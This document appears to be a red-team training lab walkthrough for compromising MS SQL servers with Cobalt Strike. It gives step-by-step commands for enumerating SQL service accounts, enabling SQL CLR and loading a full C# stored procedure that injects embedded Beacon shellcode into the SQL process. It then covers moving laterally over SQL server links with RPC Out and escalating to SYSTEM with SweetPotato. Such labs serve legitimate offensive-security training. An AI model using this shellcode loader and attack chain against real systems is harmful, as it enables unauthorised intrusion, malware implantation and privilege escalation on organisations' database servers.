# SQL Servers Lab

>The objective for this lab is to gain code execution, move laterally, and elevate privilege on SQL servers.

===

# Enumeration

1. Launch Cobalt Strike and connect to the team server.
2. Load the SQL-BOF Aggressor script.
  1. Go to **Cobalt Strike > Script Manager**.
  2. Click **Load**.
  3. Select *C:\Tools\SQL-BOF\SQL\SQL.cna*.

3. Interact with the medium-integrity Beacon and search for MS SQL servers configured for Kerberos authentication.

    ```Beacon-nocolor
    ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
    ```

4. Get information about the *lon-db-1* instance and your current privileges:
  1. `sql-info lon-db-1`
  2. `sql-whoami lon-db-1`

⚠️ These outputs show that we're authenticating as pchilds but only have guest privileges.

5. Your domain enumeration can help reveal principals that may have a sysadmin role.

	```Beacon-nocolor
    ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
    ```

6. Impersonate the *rsteel* user.
7. Query your privileges on the SQL instance again and see how they've changed.

===

# Code Execution

1. Check the status of SQL CLR.

    ```Beacon-nocolor
    sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
    ```

⚠️ This will return 0 (disabled).

2. Enable SQL CLR on *lon-db-1*.
  1. `sql-enableclr lon-db-1`

3. Generate x64 SMB Beacon shellcode.
    1. **Payloads > Windows Stageless Payload**
    2. Listener: **smb**
    3. Output: **Raw**
    4. Exit Function: **Thread**
    5. Click **Generate**
    6. Save to *C:\Payloads\smb_x64.xthread.bin*

4. Open Visual Studio and create a new Class Library (.NET Framework) project:
    1. Project name: `MyProcedure`.
    2. Place in the same directory: Checked

5. Add *smb_x64.xthread.bin* as an embedded resource.
6. Paste the following code:

    ```c#
    using System;
    using System.IO;
    using System.Reflection;
    using System.Runtime.InteropServices;
    using Microsoft.SqlServer.Server;
    
    public partial class StoredProcedures
    {
        [SqlProcedure]
        public static void MyProcedure()
        {
            var assembly = Assembly.GetExecutingAssembly();
    
            byte[ ] shellcode;
    
            // read embedded payload
            using (var rs = assembly.GetManifestResourceStream("MyProcedure.smb_x64.xthread.bin"))
            {
                using (var ms = new MemoryStream())
                {
                    rs.CopyTo(ms);
                    shellcode = ms.ToArray();
                }
            }
    
            // allocate memory
            var hMemory = VirtualAlloc(
                IntPtr.Zero,
                (uint)shellcode.Length,
                VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
                PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);
    
            // copy shellcode
            WriteProcessMemory(
                new IntPtr(-1),
                hMemory,
                shellcode,
                (uint)shellcode.Length,
                out _);
    
            // create thread
            var hThread = CreateThread(
                IntPtr.Zero,
                0,
                hMemory,
                IntPtr.Zero,
                THREAD_CREATION_FLAGS.THREAD_CREATE_RUN_IMMEDIATELY,
                out _);
    
            // close thread handle
            CloseHandle(hThread);
        }
    
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            VIRTUAL_ALLOCATION_TYPE flAllocationType,
            PAGE_PROTECTION_FLAGS flProtect);
    
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[ ] lpBuffer,
            uint nSize,
            out uint lpNumberOfBytesWritten);
    
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            THREAD_CREATION_FLAGS dwCreationFlags,
            out uint lpThreadId);
    
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern bool CloseHandle(IntPtr hObject);
    
        [Flags]
        public enum VIRTUAL_ALLOCATION_TYPE : uint
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000,
            MEM_RESET = 0x00080000,
            MEM_RESET_UNDO = 0x01000000,
            MEM_REPLACE_PLACEHOLDER = 0x00004000,
            MEM_LARGE_PAGES = 0x20000000,
            MEM_RESERVE_PLACEHOLDER = 0x00040000,
            MEM_FREE = 0x00010000,
        }
    
        [Flags]
        public enum PAGE_PROTECTION_FLAGS : uint
        {
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400,
            PAGE_GRAPHICS_NOACCESS = 0x00000800,
            PAGE_GRAPHICS_READONLY = 0x00001000,
            PAGE_GRAPHICS_READWRITE = 0x00002000,
            PAGE_GRAPHICS_EXECUTE = 0x00004000,
            PAGE_GRAPHICS_EXECUTE_READ = 0x00008000,
            PAGE_GRAPHICS_EXECUTE_READWRITE = 0x00010000,
            PAGE_GRAPHICS_COHERENT = 0x00020000,
            PAGE_GRAPHICS_NOCACHE = 0x00040000,
            PAGE_ENCLAVE_THREAD_CONTROL = 0x80000000,
            PAGE_REVERT_TO_FILE_MAP = 0x80000000,
            PAGE_TARGETS_NO_UPDATE = 0x40000000,
            PAGE_TARGETS_INVALID = 0x40000000,
            PAGE_ENCLAVE_UNVALIDATED = 0x20000000,
            PAGE_ENCLAVE_MASK = 0x10000000,
            PAGE_ENCLAVE_DECOMMIT = 0x10000000,
            PAGE_ENCLAVE_SS_FIRST = 0x10000001,
            PAGE_ENCLAVE_SS_REST = 0x10000002,
            SEC_PARTITION_OWNER_HANDLE = 0x00040000,
            SEC_64K_PAGES = 0x00080000,
            SEC_FILE = 0x00800000,
            SEC_IMAGE = 0x01000000,
            SEC_PROTECTED_IMAGE = 0x02000000,
            SEC_RESERVE = 0x04000000,
            SEC_COMMIT = 0x08000000,
            SEC_NOCACHE = 0x10000000,
            SEC_WRITECOMBINE = 0x40000000,
            SEC_LARGE_PAGES = 0x80000000,
            SEC_IMAGE_NO_EXECUTE = 0x11000000,
        }
    
        [Flags]
        public enum THREAD_CREATION_FLAGS : uint
        {
            THREAD_CREATE_RUN_IMMEDIATELY = 0x00000000,
            THREAD_CREATE_SUSPENDED = 0x00000004,
            STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000,
        }
    }
    ```

⚠️ This will perform classic injection where the Beacon will run inside the MS SQL process.

7. Load the DLL on *lon-db-1*.

    ```beacon-nocolor
    sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
    ```

8. Link to the Beacon.

	```Beacon-nocolor
	link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
    ```

⚠️ Remember that this pipename is defined by your SMB listener.

⚠️ This command will fail with **ERROR_LOGON_FAILURE** if you do not have a CIFS service ticket (or a TGT) in your Beacon session.  You can either:
    1. Run the command from the pchilds' Beacon instead. Windows will automatically request a service ticket using the their TGT.
    2. Use rsteel's TGT to request a CIFS service ticket and manually import it into your session.

9. Disable SQL CLR *lon-db-1*.
  1. `sql-disableclr lon-db-1`

===

# Lateral Movement

1. Enumerate SQL links on *lon-db-1*.
  1. `sql-links lon-db-1`

2. Verify your privileges on *lon-db-2* via *lon-db-1*.
  1. `sql-whoami lon-db-1 "" lon-db-2`

3. Check the status of RPC Out on the link.
  1. `sql-checkrpc lon-db-1`

4. Enable RPC Out on the link to *lon-db-2*.
  1. `sql-enablerpc lon-db-1 lon-db-2`

5. Execute the SQL CLR payload on *lon-db-2* via *lon-db-1*.

    ```Beacon-nocolor
    sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
    ```

6. Link to the Beacon on *lon-db-2* from the Beacon running on *lon-db-1*.
7. Disable RPC on the link.
    1. `sql-disablerpc lon-db-1 lon-db-2`

===

# Privilege Escalation

1. Interact with the new Beacon running on *lon-db-2*.
2. Enumerate token privileges.
    1. `whoami`

⚠️ The output from this BOF will show that **SeImpersonatePrivilege** is **Enabled**.

3. Generate a TCP (localhost-only) executable payload.
    1. **Payloads > Windows Stageless Payload**
    2. Listener: **tcp-local**
    3. Click **Generate**
    4. Save to *C:\Payloads\tcp-local_x64.exe*

4. Change Beacon's working directory.

    ```Beacon-nocolor
    cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
    ```

5. Upload a tcp-local Payload.
  1. `upload C:\Payloads\tcp-local_x64.exe`

6. Execute the payload using SweetPotato.

    ```Beacon-nocolor
    execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
    ```

7. Connect to the new Beacon.
  1. `connect localhost 1337`


<img src="/images/sql-servers-lab-graph-view.png" width=860>


⚠️ In this lab you have learned how to enumerate, compromise, move laterally, and elevate privileges on MS SQL servers.

